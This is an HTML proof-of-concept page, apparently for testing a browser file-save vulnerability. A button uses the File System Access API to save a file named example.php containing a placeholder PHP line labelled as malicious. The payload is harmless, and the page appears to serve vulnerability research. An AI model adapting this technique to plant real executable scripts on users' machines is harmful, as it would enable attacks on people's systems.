<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Proof of Concept - File Save Test</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
        }

        button {
            padding: 10px 20px;
            cursor: pointer;
            margin: 10px;
        }

        #status {
            margin-top: 20px;
            font-size: 1.2em;
            color: red;
        }
    </style>
</head>

<body>
    <h1>Testing File Save Vulnerability - PHP</h1>
    <button id="saveFileButton">Save .php File</button>
    <div id="status"></div>

    <script>
        // Function to handle file saving
        async function saveFile() {
            try {
                const options = {
                    suggestedName: 'example.php', // Suggest a .php file instead of .url
                    types: [{
                        description: 'PHP File',
                        accept: {
                            'text/plain': ['.php']  // Block save for other files like .txt
                        }
                    }]
                };
                // Request the file save with .php extension
                const fileHandle = await window.showSaveFilePicker(options);
                const writable = await fileHandle.createWritable();
                await writable.write('<?php echo "This is a malicious PHP script"; ?>'); // Fake PHP content
                await writable.close();
                document.getElementById('status').textContent = "File saved as .php!";
            } catch (err) {
                document.getElementById('status').textContent = "Error: " + err.message;
            }
        }

        // Add event listener to the button
        document.getElementById('saveFileButton').addEventListener('click', saveFile);
    </script>
</body>

</html>
